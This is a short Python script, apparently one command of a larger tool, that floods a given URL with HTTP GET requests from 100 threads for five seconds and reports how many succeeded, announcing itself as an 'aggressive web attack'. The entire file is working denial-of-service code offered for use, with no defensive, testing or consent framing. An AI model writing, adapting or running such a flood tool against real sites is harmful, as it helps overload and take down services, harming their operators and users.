import requests
import threading
import time
from colorama import Fore, init

init(autoreset=True)

def attack_worker(url, stop_time, stats):
    success = 0
    fail = 0
    while time.time() < stop_time:
        try:
            r = requests.get(url, timeout=3)
            if r.status_code == 200:
                success += 1
            else:
                fail += 1
        except:
            fail += 1
    stats.append((success, fail))

def run(args):
    if len(args) < 1:
        print(Fore.LIGHTRED_EX + "Usage: webattack <url>")
        return

    url = args[0]

    duration = 5  
    threads_count = 100 

    print(Fore.LIGHTRED_EX + f"Starting aggressive web attack on {url} for {duration} seconds with {threads_count} threads...")

    stop_time = time.time() + duration
    threads = []
    stats = []

    for _ in range(threads_count):
        t = threading.Thread(target=attack_worker, args=(url, stop_time, stats))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    total_success = sum(s for s, f in stats)
    total_fail = sum(f for s, f in stats)

    print(Fore.LIGHTGREEN_EX + f"Attack finished! Successful requests: {total_success}, Failed requests: {total_fail}")
